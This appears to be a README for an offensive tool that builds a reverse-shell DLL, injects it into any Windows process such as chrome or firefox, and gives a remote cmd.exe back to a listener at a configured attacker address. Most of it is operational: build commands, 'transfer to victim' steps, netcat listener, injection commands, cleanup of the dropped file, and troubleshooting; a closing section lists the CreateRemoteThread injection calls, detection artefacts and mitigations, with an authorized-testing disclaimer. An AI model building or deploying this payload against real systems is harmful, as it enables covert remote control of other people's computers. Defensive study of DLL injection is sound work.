# proc-injection-2 — reverse-shell DLL

Pure WinSock reverse shell DLL. Load into any x64 Windows process → `cmd.exe` connects back to your attacker.

```
revshell_pure_dll.cpp    source
revshell_pure_dll.dll    pre-built x64 (LHOST = 192.168.68.101, LPORT = 4444)
```

## Config

Edit the top of `revshell_pure_dll.cpp` and rebuild:

```cpp
static const char*    LHOST                = "192.168.68.101";
static const int      LPORT                = 4444;
static const char*    CHILD_EXE_NAME       = "revShell.exe";
static const wchar_t* DESCRIPTION_OVERRIDE = L"RevShell - WinCmd Proc";
```

## Build on Windows

Needs MSVC v143 (VS 2022 Build Tools). Open **"x64 Native Tools Command Prompt for VS 2022"**:

```
cl /LD /EHsc /O2 /nologo revshell_pure_dll.cpp /link ws2_32.lib /OUT:revshell_pure_dll.dll
```

## Build on Linux (cross-compile)

Install `mingw-w64`:

```bash
sudo apt install -y mingw-w64         # Kali / Debian / Ubuntu
sudo pacman -S mingw-w64-gcc          # Arch
sudo dnf install mingw64-gcc-c++      # Fedora
```

Build:

```bash
x86_64-w64-mingw32-g++ -shared -O2 -s \
  -o revshell_pure_dll.dll revshell_pure_dll.cpp \
  -lws2_32 -Wl,--subsystem,windows,--kill-at
```

Output is a Windows x64 PE DLL. Transfer to victim.

## Use

### 1. Attacker — start listener

```bash
nc -lvnp 4444
```

### 2. Victim — inject into any x64 process

Any injector that LoadLibrary's a DLL works. `pop.exe` from `../proc-injection-1/` is the easiest:

```powershell
pop.exe <target_name_or_pid> --dll <path>\revshell_pure_dll.dll
```

Examples (same binary, any target):

```powershell
pop.exe MVTC    --dll C:\payloads\revshell_pure_dll.dll
pop.exe chrome  --dll C:\payloads\revshell_pure_dll.dll
pop.exe firefox --dll C:\payloads\revshell_pure_dll.dll
pop.exe 1234    --dll C:\payloads\revshell_pure_dll.dll
```

### 3. Attacker — shell lands

```
Ncat: Connection from 192.168.X.X:51234.
Microsoft Windows [Version 10.0.20348.587]

C:\Program Files (x86)\<TargetApp>>_
```

Interactive `cmd.exe` running as the target's user, parented to the target process.

## Verify

```powershell
Get-Process revShell | Select Id, ProcessName,
    @{N='Parent';E={(Get-CimInstance Win32_Process -Filter "ProcessId=$($_.Id)").ParentProcessId}}, Path
```

Expect:
- `ProcessName = revShell`
- `Parent = <PID of target>`
- `Path = <target install folder>\revShell.exe` (or `%USERPROFILE%\revShell.exe` fallback)

Task Manager → expand target → child row:

```
RevShell - WinCmd Proc    revShell.exe
    Console Window Host   conhost.exe
```

## Cleanup

Drop file auto-deletes when the shell exits. Force-clean:

```powershell
Remove-Item "C:\Program Files (x86)\<TargetApp>\revShell.exe","$env:USERPROFILE\revShell.exe" -Force -EA 0
Get-Process <target> | Stop-Process -Force
```

## Troubleshoot

| Symptom | Cause |
|---|---|
| Shell doesn't connect | Wrong `LHOST`, firewall, listener not running |
| Takes 25s to spawn | `connect()` timing out — DLL retries 10× × 2s delay |
| Drops to `%USERPROFILE%` not install dir | Need Admin to write to `Program Files` |
| MSVC: `_snprintf_s` unresolved | Add `/EHsc` to the build line |
| MinGW: can't find `-lws2_32` | Install `mingw-w64` full package, not just `-base` |

---

## Technique (background)

**MITRE ATT&CK T1055.001** — DLL Injection via `CreateRemoteThread + LoadLibraryA`.

The injector (your `pop.exe --dll` or any equivalent) does:

```c
OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_pid);
VirtualAllocEx(hProc, NULL, strlen(dll_path)+1, PAGE_READWRITE);
WriteProcessMemory(hProc, buf, dll_path, len);
CreateRemoteThread(hProc, NULL, 0, LoadLibraryA, buf, 0, NULL);
```

Four Win32 calls. The target's own kernel32 does the actual load when `CreateRemoteThread` fires on `LoadLibraryA`.

Visible to defenders:
- New thread inside target (Process Hacker Threads tab)
- Your DLL in the module list (Process Hacker Modules tab)
- ETW `Microsoft-Windows-Kernel-ImageLoad` event for the DLL
- Sysmon Event ID 7 (image loaded) + Event ID 10 (process access with suspicious GrantedAccess)

Mitigations (for the "secure code fix" section of a pentest report):

- `SetProcessMitigationPolicy(ProcessDynamicCodePolicy)` — blocks `VirtualAllocEx(RWX)` in the host
- `ProcessImageLoadPolicy.NoRemoteImages` — blocks DLL loading from UNC paths
- Code Integrity Guard — only Microsoft-signed DLLs can load
- Process Protection Level (PPL) — only PPL callers can `OpenProcess` with `VM_WRITE`
- EDR with ETW `Microsoft-Windows-Threat-Intelligence` provider

## Legal

Authorized testing only. Isolated VMs, your own apps, in-scope engagements, CTF challenges. Running against anything else is a crime in most jurisdictions.
